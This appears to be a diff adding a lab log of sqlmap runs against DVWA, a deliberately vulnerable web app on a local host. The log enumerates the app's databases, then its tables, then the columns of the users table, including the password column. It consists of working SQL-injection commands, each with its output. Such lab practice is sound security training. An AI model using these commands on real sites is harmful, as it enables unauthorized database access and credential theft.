@@ -1,0 +1,45 @@
+ sqlmap -u 'http://192.168.0.80/DVWA-1.0.8/vulnerabilities/sqli/?id=1&Submit=Submit#'
+ --cookie="security=low; PHPSESSID=0dim4l9ngdspqoq70gdihpcl41" --dbs
+
+ [07:02:08] [INFO] fetching database names
+ available databases [7]:
+ [*] dvwa
+ [*] information_schema
+ [*] mediawiki
+ [*] moodle
+ [*] mysql
+ [*] performance_schema
+ [*] snort
+
+ sqlmap -u 'http://192.168.0.80/DVWA-1.0.8/vulnerabilities/sqli/?id=1&Submit=Submit#'
+ --cookie="security=low; PHPSESSID=0dim4l9ngdspqoq70gdihpcl41" -D dvwa --tables
+
+ [07:08:39] [INFO] fetching tables for database: 'dvwa'
+ [07:08:39] [WARNING] reflective value(s) found and filtering out
+ Database: dvwa
+ [2 tables]
+ +-----------+
+ | guestbook |
+ | users     |
+ +-----------+
+
+ sqlmap -u 'http://192.168.0.80/DVWA-1.0.8/vulnerabilities/sqli/?id=1&Submit=Submit#'
+ --cookie="security=low; PHPSESSID=0dim4l9ngdspqoq70gdihpcl41" -D dvwa -T users --columns
+
+ [07:11:51] [INFO] fetching columns for table 'users' in database 'dvwa'
+ [07:11:51] [WARNING] reflective value(s) found and filtering out
+ Database: dvwa
+ Table: users
+ [6 columns]
+ +------------+-------------+
+ | Column     | Type        |
+ +------------+-------------+
+ | user       | varchar(15) |
+ | avatar     | varchar(70) |
+ | first_name | varchar(15) |
+ | last_name  | varchar(15) |
+ | password   | varchar(32) |
+ | user_id    | int(6)      |
+ +------------+-------------+
+
+
